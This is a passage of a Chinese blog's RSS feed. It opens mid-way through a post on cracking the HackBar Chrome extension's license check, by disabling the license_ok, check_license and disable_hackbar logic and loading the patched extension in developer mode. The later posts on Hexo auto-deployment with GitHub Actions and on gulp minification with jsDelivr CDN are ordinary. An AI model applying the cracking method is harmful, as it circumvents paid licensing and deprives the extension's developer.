</span><span class="c1"></span>                        <span class="kr">const</span> <span class="nx">pong</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">pong</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">pong</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                            <span class="c1">// 证书无效，调用函数显示红框并使功能不可用
</span><span class="c1"></span>                            <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
                        <span class="c1">// 授权服务器连接不上
</span><span class="c1"></span>                        <span class="nx">disable_hackbar</span><span class="p">();</span>
                    <span class="p">});</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
            <span class="p">});</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// 证书不存在，直接禁用插件
</span><span class="c1"></span>        <span class="nx">disable_hackbar</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="p">........</span>
<span class="c1">// 证书检查函数
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">check_license</span><span class="p">(){</span>
    <span class="c1">// 检查 license_ok 标记
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">license_ok</span><span class="p">){</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Please input valid license!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="进行破解">进行破解</h3>
<p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p>
<ul>
<li><code>license_ok</code> 一开始是 <code>true</code></li>
<li>证书检查失败的红框一开始是隐藏的</li>
<li>授权验证失败调用的是 <code>disable_hackbar()</code> 函数</li>
<li>只在一处地方会向 服务器 检查证书状况</li>
<li>其他地方都是通过 <code>check_license()</code> 也就是 <code>license_ok</code> 标记检查授权的</li>
</ul>
<p>也就是说，一共有两个关键点：</p>
<ol>
<li>证书检查失败的红框</li>
<li>功能的正常使用</li>
</ol>
<p>针对证书检查失败的红框，只需要 <code>disable_hackbar</code> 函数不运行 或者 里面去除<code>hidden</code>标记的代码不运行，就不会显示红框了</p>
<p>针对功能的正常使用，有很多办法可以达到：</p>
<ol>
<li>首先我们知道，这些功能都是在调用 <code>check_license()</code> 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉</li>
<li>我们还发现， <code>check_license()</code> 函数是通过 <code>license_ok</code> 标记检查授权的，所以我们可以在检查前将 <code>license_ok</code> 标记为 <code>true</code>，或者说将前面标记 <code>license_ok = false</code> 的代码注释掉</li>
</ol>
<p>最后我们发现，红框一开始是不显示的，<code>license_ok</code>一开始是<code>true</code>的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、<code>license_ok</code>为<code>false</code>，所以那段代码直接删除了就ok了</p>
<blockquote>
<p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p>
</blockquote>
<h2 id="插件安装">插件安装</h2>
<p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p>
<p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p>
<p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p>
<p>左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了</p>
<p></p>
<p>通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用</p>
<blockquote>
<p>当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布
这样所有人都可以安装了，当然推荐是 <strong>不公开</strong> 的发布模式</p>
</blockquote>
<p>安装后，按F12，插件就可以正常使用了</p>
<p></p>
<h2 id="总结">总结</h2>
<p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
]]></description></item><item><title>使用Github Actions对Hexo博客自动部署</title><link>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</link><pubDate>Sat, 21 Mar 2020 09:24:56 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 <code>hexo g</code> 生成静态网页，然后 <code>hexo d</code> 将public目录推送到github、coding、gitee等平台。</p>
<p>但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。</p>
<h2 id="操作">操作</h2>
<h3 id="开启actions功能">开启actions功能</h3>
<p>在我们博客的github仓库顶部可以找到 Actions 菜单，在里面我们可以搜索、选择各种预备好的actions模板，也可以点击 <code>Set up a workflow yourself</code> 按钮创建自己的工作流。</p>
<p></p>
<p>这里我的部署工作稍微复杂点，所以选择自己编写工作流配置文件。</p>
<p>在手动编写面板的右侧可以搜索别人写好的各种actions，方便我们使用这些actions配置一些基本的工作</p>
<p></p>
<p>当然，也可以选择在 hexo 根目录下创建 <code>.github/workflows</code> 目录，并在里面编写github actions配置文件的方法来开启这个功能。</p>
<h3 id="基本部署">基本部署</h3>
<p>首先我们需要将git库的代码检出到github actions提供的容器中，这里使用github提供的checkout步骤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@master</span><span class="w">
</span><span class="w">  </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>因为hexo需要依赖node.js环境，所以我们还要安装node环境</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/setup-node@master</span><span class="w">
</span><span class="w">  </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">node-version</span><span class="p">:</span><span class="w"> </span><span class="m">12.</span><span class="l">x</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>有了node环境后我们需要安装各种依赖包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Installation</span><span class="w">
</span><span class="w">  </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="sd">|
</span><span class="sd">    npm install
</span><span class="sd">    npm install -g hexo-cli
</span></code></pre></td></tr></table>
</div>
</div><p>依赖装好后就可以执行命令生成静态网站了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Generate</span><span class="w">
</span><span class="w">  </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l">hexo clean &amp;&amp; hexo g</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>最后一步就是将生成的public目录推到github仓库的page分支上，这样github pages就会将最新的网站自动部署了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Deploy</span><span class="w">
</span><span class="w">  </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-gh-pages@v3</span><span class="w">
</span><span class="w">  </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">github_token</span><span class="p">:</span><span class="w"> </span><span class="l">${{ secrets.GITHUB_TOKEN }}</span><span class="w">
</span><span class="w">    </span><span class="nt">publish_dir</span><span class="p">:</span><span class="w"> </span><span class="l">./public</span><span class="w">
</span><span class="w">    </span><span class="nt">cname</span><span class="p">:</span><span class="w"> </span><span class="l">g.blog.lgf.im</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><h3 id="增加更多功能">增加更多功能</h3>
<p>在github actions工作流中，还可以完成更多更复杂的操作，里面可以直接执行shell脚本，可以使用docker镜像提供的特殊环境，大家可以根据自己需求进行修改。</p>
<h2 id="完整配置文件">完整配置文件</h2>
<p>我的配置文件是适合我自己博客用的，里面还包括了网页、js、css、图片的压缩，cdn链接的替换，自动打release方便绕过jsDelivr的缓存。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml"><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Hexo CICD</span><span class="w">
</span><span class="w"></span><span class="nt">on</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">push</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="l">master</span><span class="w">
</span><span class="w"></span><span class="nt">jobs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hexo build &amp; deploy</span><span class="w">
</span><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu-18.04</span><span class="w">
</span><span class="w">    </span><span class="nt">steps</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@master</span><span class="w">
</span><span class="w">      </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">    </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/setup-node@master</span><span class="w">
</span><span class="w">      </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">node-version</span><span class="p">:</span><span class="w"> </span><span class="m">12.</span><span class="l">x  </span><span class="w">
</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">replace cdn url</span><span class="w">
</span><span class="w">      </span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l">replace</span><span class="w">
</span><span class="w">      </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="sd">|
</span><span class="sd">        tagname=$(date +%y%j%H%M)
</span><span class="sd">        sed -i &#34;s/hexoblog/hexoblog@$tagname/g&#34; _config.yml
</span><span class="sd">        sed -i &#34;s/hexoblog/hexoblog@$tagname/g&#34; themes/cactus/_config.yml
</span><span class="sd">        echo &#34;::set-output name=tagname::$tagname&#34;
</span><span class="sd">    - name: Installation
</span><span class="sd">      run: |
</span><span class="sd">        npm install
</span><span class="sd">        npm install -g hexo-cli gulp
</span><span class="sd">    - name: Generate
</span><span class="sd">      run: hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d
</span><span class="sd">    - name: Deploy
</span><span class="sd">      uses: peaceiris/actions-gh-pages@v3
</span><span class="sd">      with:
</span><span class="sd">        github_token: ${{ secrets.GITHUB_TOKEN }}
</span><span class="sd">        publish_dir: ./public
</span><span class="sd">        cname: g.blog.lgf.im
</span><span class="sd">    - name: Create Release
</span><span class="sd">      uses: actions/create-release@latest
</span><span class="sd">      env:
</span><span class="sd">        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
</span><span class="sd">      with:
</span><span class="sd">        tag_name: ${{ steps.replace.outputs.tagname }}
</span><span class="sd">        release_name: ${{ steps.replace.outputs.tagname }}
</span><span class="sd">        body: Automatic generated
</span><span class="sd">        draft: false
</span><span class="sd">        prerelease: true
</span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>在github actions将page专用分支更新后，zeit\netlify\github pages三个平台都会自动将最新的内容部署上，这样我就只需要关注博客内容，后续操作都不需要管了</p>
</blockquote>
]]></description></item><item><title>加快Github Pages国内访问速度</title><link>https://lgf.im/posts/coding/speedup-github-page/</link><pubDate>Thu, 19 Mar 2020 17:17:53 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/speedup-github-page/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>相信不少小伙伴都在使用 Github Pages 提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用 Github Pages 搭建的网站速度普遍不快，因此很多小伙伴只能转战国内付费的服务器和 CDN。</p>
<p>正巧我也在使用 Github Pages 搭建自己的静态博客，正好来说一下我的优化方法。</p>
<h2 id="压缩">压缩</h2>
<p>默认情况下，如果我们查看 Hexo 生成的静态网页源代码，会发现存在大量的空格、空行、注释等无用内容。同样的，如果使用的 hexo 主题没有进行优化，大量的 css 和 js 文件也存在这样的垃圾内容。</p>
<p>如果你在一些大型网站右键查看网页源代码，你会发现他们的 html\js\css 是经过压缩处理的，没有多余的换行和注释，这势必会节省带宽流量和传输时间，提升用户体验。</p>
<p>所以我们优化速度的第一关就是对 Hexo 生成的代码进行压缩。</p>
<p>这里我使用的工具是 gulp</p>
<h3 id="安装-gulp">安装 gulp</h3>
<p>在自己本机安装</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install gulp -g
</code></pre></td></tr></table>
</div>
</div><p>为了 Github Action 或其他 CI\CD 平台也能够进行安装，这里推荐</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install gulp --save-dev
</code></pre></td></tr></table>
</div>
</div><p>我们还需要一些依赖</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install --save-dev <span class="se">\
</span><span class="se"></span>            gulp-minify-css <span class="se">\
</span><span class="se"></span>            gulp-babel <span class="se">\
</span><span class="se"></span>            gulp-uglify <span class="se">\
</span><span class="se"></span>            gulp-htmlmin <span class="se">\
</span><span class="se"></span>            gulp-htmlclean <span class="se">\
</span><span class="se"></span>            gulp-imagemin <span class="se">\
</span><span class="se"></span>            imagemin-jpegtran <span class="se">\
</span><span class="se"></span>            imagemin-svgo <span class="se">\
</span><span class="se"></span>            imagemin-gifsicle <span class="se">\
</span><span class="se"></span>            imagemin-optipng
</code></pre></td></tr></table>
</div>
</div><h3 id="创建配置文件">创建配置文件</h3>
<p>在博客 hexo 的根目录下，新建 <code>gulpfile.js</code> 配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">gulp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">minifycss</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-minify-css&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">uglify</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-uglify&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">htmlmin</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-htmlmin&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">htmlclean</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-htmlclean&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">imagemin</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-imagemin&#34;</span><span class="p">);</span>

<span class="c1">// 压缩css文件
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-css&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">(</span><span class="s2">&#34;./public/**/*.css&#34;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">minifycss</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 压缩html
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-html&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">(</span><span class="s2">&#34;./public/**/*.html&#34;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">htmlclean</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span>
      <span class="nx">htmlmin</span><span class="p">({</span>
        <span class="nx">collapseWhitespace</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">collapseBooleanAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeComments</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeEmptyAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeScriptTypeAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeStyleLinkTypeAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">minifyJS</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">minifyCSS</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">minifyURLs</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">ignoreCustomFragments</span><span class="o">:</span> <span class="p">[</span><span class="sr">/\{\{[\s\S]*?\}\}/</span><span class="p">],</span>
      <span class="p">})</span>
    <span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 压缩js文件
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-js&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">([</span><span class="s2">&#34;./public/**/*.js&#34;</span><span class="p">,</span> <span class="s2">&#34;!./public/js/**/*min.js&#34;</span><span class="p">])</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">uglify</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 压缩图片
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-images&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">([</span>
      <span class="s2">&#34;./public/**/*.png&#34;</span><span class="p">,</span>
      <span class="s2">&#34;./public/**/*.jpg&#34;</span><span class="p">,</span>
      <span class="s2">&#34;./public/**/*.gif&#34;</span><span class="p">,</span>
      <span class="s2">&#34;./public/**/*.svg&#34;</span><span class="p">,</span>
    <span class="p">])</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span>
      <span class="nx">imagemin</span><span class="p">([</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">gifsicle</span><span class="p">({</span> <span class="nx">interlaced</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}),</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">mozjpeg</span><span class="p">({</span> <span class="nx">quality</span><span class="o">:</span> <span class="mi">75</span><span class="p">,</span> <span class="nx">progressive</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}),</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">optipng</span><span class="p">({</span> <span class="nx">optimizationLevel</span><span class="o">:</span> <span class="mi">5</span> <span class="p">}),</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">svgo</span><span class="p">({</span>
          <span class="nx">plugins</span><span class="o">:</span> <span class="p">[{</span> <span class="nx">removeViewBox</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">cleanupIDs</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}],</span>
        <span class="p">}),</span>
      <span class="p">])</span>
    <span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span>
  <span class="s2">&#34;default&#34;</span><span class="p">,</span>
  <span class="nx">gulp</span><span class="p">.</span><span class="nx">series</span><span class="p">(</span>
    <span class="nx">gulp</span><span class="p">.</span><span class="nx">parallel</span><span class="p">(</span><span class="s2">&#34;minify-html&#34;</span><span class="p">,</span> <span class="s2">&#34;minify-css&#34;</span><span class="p">,</span> <span class="s2">&#34;minify-js&#34;</span><span class="p">,</span> <span class="s2">&#34;minify-images&#34;</span><span class="p">)</span>
  <span class="p">)</span>
<span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用方法">使用方法</h3>
<p>在使用 <code>hexo g</code> 生成静态网站后， 运行 <code>gulp</code> 进行压缩</p>
<h2 id="使用-cdn">使用 CDN</h2>
<p>如果你查看博客的网络请求内容，你会发现在 html 加载之后，还有一堆小文件等待加载，而这些 css\js\图片文件的加载占据了大部分的网页打开时间。</p>
<p>因为 Github Pages 的延迟巨大，速度极慢，我们更有必要使用国内的 CDN 对这些资源进行分发。</p>
<p>不想使用国内付费的 CDN 服务，我尝试过使用 CloudFlare 进行加速（实质减速）效果不佳，后来发现了 jsDelivr。</p>
<p>jsDelivr 是一家开源免费 CDN，主要是对 npm 包进行 CDN 分发</p>
<p>绝妙的是它还能对 Github 和 Wordpress 进行 CDN 分发</p>
<p>我们可以借助 jsDelivr 的 Github 资源分发 服务来对我们博客中的 css\js\小图片进行加速</p>
<blockquote>
<p>这是我目前找到的唯一一家在国内有节点并且不需要备案的 CDN 分发服务</p>
</blockquote>
<p>这里我就以我使用的主题为例，分享一下我如何使用 jsDelivr 进行 CDN 分发</p>
<h3 id="链接格式">链接格式</h3>
<p>jsDelivr 针对 Github 资源有众多 URL 格式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">https://cdn.jsdelivr.net/gh/user/repo@version/file
https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery/
</code></pre></td></tr></table>
</div>
</div><p>考虑到 jsDelivr 默认缓存时间是 7 天，如果我们想要修改实时生效而不需要等到缓存过期，最适合的是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js

